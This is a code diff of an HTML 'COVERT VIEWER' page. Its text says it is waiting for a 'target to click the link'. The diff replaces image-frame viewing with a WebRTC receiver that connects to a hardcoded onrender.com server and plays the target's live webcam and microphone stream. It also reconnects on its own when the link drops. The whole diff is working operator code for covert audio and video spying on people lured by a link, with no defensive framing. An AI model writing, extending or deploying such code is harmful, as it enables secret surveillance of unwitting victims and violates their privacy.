@@ -14,11 +14,12 @@
             padding: 20px;
         }
 
-        img {
+        video {
             max-width: 80%;
             border: 2px solid #00ffcc;
             border-radius: 5px;
             box-shadow: 0 0 15px #00ffcc;
+            background: black;
         }
 
         h1 {
@@ -30,24 +31,99 @@
 <body>
     <h1>COVERT VIEWER</h1>
     <p>Waiting for target to click the link...</p>
-    <img id="targetCam" src="" alt="No Signal" style="display:none;">
+
+    <!-- We use a <video> tag now instead of an <img> -->
+    <video id="targetCam" autoplay playsinline style="display:none;"></video>
 
     <script>
         const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
         const host = window.location.host || "hangon-k31m.onrender.com";
-        let ws = new WebSocket(`${protocol}//${host}/ws/controller`);
+        const wsUrl = `${protocol}//${host}/ws/controller`;
 
-        ws.onopen = () => console.log("Viewer connected to server.");
-
-        ws.onmessage = function (event) {
-            if (event.data.startsWith("VIDEO:")) {
-                // Extract the base64 image and display it
-                const imgData = event.data.replace("VIDEO:", "");
-                const img = document.getElementById('targetCam');
-                img.src = imgData;
-                img.style.display = 'inline-block';
-            }
+        const rtcConfig = {
+            iceServers: [
+                { urls: "stun:stun.l.google.com:19302" },
+                { urls: "stun:stun1.l.google.com:19302" }
+            ]
         };
+
+        let ws;
+        let pc;
+
+        function connectWebSocket() {
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = () => {
+                console.log("Viewer connected to " + wsUrl);
+                initOffer();
+            };
+
+            ws.onmessage = async (event) => {
+                try {
+                    const msg = JSON.parse(event.data);
+                    if (msg.type === "answer" && pc) {
+                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
+                    } else if (msg.type === "ice" && pc) {
+                        await pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                    }
+                } catch (e) {
+                    console.error("Error processing message:", e);
+                }
+            };
+
+            ws.onerror = (err) => console.error("WebSocket error:", err);
+            ws.onclose = () => {
+                console.log("WebSocket closed. Reconnecting in 2s...");
+                setTimeout(connectWebSocket, 2000);
+            };
+        }
+
+        connectWebSocket();
+
+        // Retry connection handshake if target reconnects or connection drops
+        setInterval(() => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                if (!pc || pc.connectionState === "failed" || pc.connectionState === "disconnected") {
+                    initOffer();
+                }
+            }
+        }, 4000);
+
+        async function initOffer() {
+            try {
+                if (pc) {
+                    pc.close();
+                }
+                pc = new RTCPeerConnection(rtcConfig);
+
+                pc.addTransceiver('audio', { direction: 'recvonly' });
+                pc.addTransceiver('video', { direction: 'recvonly' });
+
+                pc.ontrack = (event) => {
+                    const video = document.getElementById('targetCam');
+                    if (event.streams && event.streams[0]) {
+                        video.srcObject = event.streams[0];
+                        video.style.display = 'inline-block';
+                        console.log("Stream received!");
+                    }
+                };
+
+                pc.onicecandidate = (event) => {
+                    if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({ "type": "ice", "data": event.candidate }));
+                    }
+                };
+
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({ "type": "offer", "data": offer }));
+                }
+            } catch (err) {
+                console.error("Error creating offer:", err);
+            }
+        }
     </script>
 </body>
 
